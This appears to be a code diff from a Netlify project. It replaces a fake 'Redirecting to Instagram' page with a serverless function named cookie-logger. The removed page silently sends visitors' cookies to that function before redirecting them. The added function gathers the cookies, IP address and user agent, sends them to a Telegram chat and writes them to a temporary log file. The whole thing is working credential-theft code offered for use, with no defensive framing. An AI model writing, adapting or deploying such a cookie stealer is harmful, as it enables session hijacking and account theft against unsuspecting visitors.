@@ -1,22 +1,66 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <script>
-        // Log cookies before redirecting
-        fetch('/.netlify/functions/cookie-logger', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            credentials: 'include'
-        }).catch(err => console.error('Logging failed:', err));
+// netlify/functions/cookie-logger.js
+const axios = require('axios'); // Make sure to add 'axios' to your package.json dependencies if needed, or use fetch
 
-        // Redirect to Instagram
-        window.location.href = 'https://www.instagram.com';
-    </script>
-</head>
-<body>
-    <p>Redirecting to Instagram...</p>
-</body>
-</html>
+exports.handler = async (event, context) => {
+  const fs = require('fs');
+
+// 1. Get Data
+  let cookies = '';
+  let ip = event.headers['x-forwarded-for'] || 'Unknown';
+  let ua = event.headers['user-agent'] || 'Unknown';
+  
+  // Prefer JSON body, fallback to header
+  if (event.body) {
+    try {
+      const parsed = JSON.parse(event.body);
+      cookies = parsed.cookies || '(No cookies in body)';
+    } catch (e) {
+      cookies = event.body;
+    }
+  } else {
+    cookies = event.headers.cookie || '(No cookies in header)';
+  }
+
+  // 2. Format for Telegram
+  const timestamp = new Date().toISOString();
+  const message = `
+🍪 **New Cookie Logged!**
+📅 Time: ${timestamp}
+🌍 IP: \`${ip}\`
+📱 UA: \`${ua.substring(0, 30)}...\`
+
+🔑 **Cookies:**
+\`${cookies}\`
+  `.trim();
+
+  // 3. Send to Telegram
+  let tgStatus = '✅ Sent to Telegram';
+  try {
+    await axios.post(TELEGRAM_API, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+  } catch (error) {
+    tgStatus = '❌ Failed to send to Telegram';
+    console.error('Telegram Error:', error.message);
+  }
+
+  // 4. Save to log.txt (Netlify Ephemeral Storage)
+  const logPath = '/tmp/log.txt';
+  try {
+    fs.appendFileSync(logPath, `${message}\n\n`);
+  } catch (e) {
+    console.error('File Error:', e.message);
+  }
+
+  // 5. Return Response
+  return {
+    statusCode: 200,
+    body: JSON.stringify({ 
+      success: true, 
+      message: 'Cookies logged',
+      telegram: tgStatus
+    })
+  };
+};
